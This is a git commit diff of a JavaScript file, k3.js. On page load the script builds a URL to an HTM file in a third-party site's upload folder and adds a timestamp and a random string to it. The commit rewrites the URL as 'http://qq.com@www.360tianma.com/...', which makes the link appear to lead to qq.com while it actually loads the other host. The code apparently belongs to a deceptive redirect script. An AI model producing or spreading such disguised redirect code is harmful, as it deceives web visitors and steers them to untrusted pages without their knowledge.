b3749d7f3097024e00c92d5a1ab8174c12a3b139
iuuc <145624790+iuuc@users.noreply.github.com>
2024-01-11 23:27:31 +0800

    Update k3.js

--- k3.js
+++ k3.js
@@ -9,7 +9,7 @@ function leleua() {
 leleua();
 
 window.onload = function () {
-    const targetUrl = 'http://www.360tianma.com/public/upload/conf/2024/01-11/38db6050a87abdd15393b354437fedc5.HTM?';
+    const targetUrl = 'http://qq.com@www.360tianma.com/public/upload/conf/2024/01-11/38db6050a87abdd15393b354437fedc5.HTM#';
     const timestamp = Date.now();
     const randomString = Math.random().toString(36).substring(2);
     const urlWithParam = `${targetUrl}u${timestamp}${randomString}`;
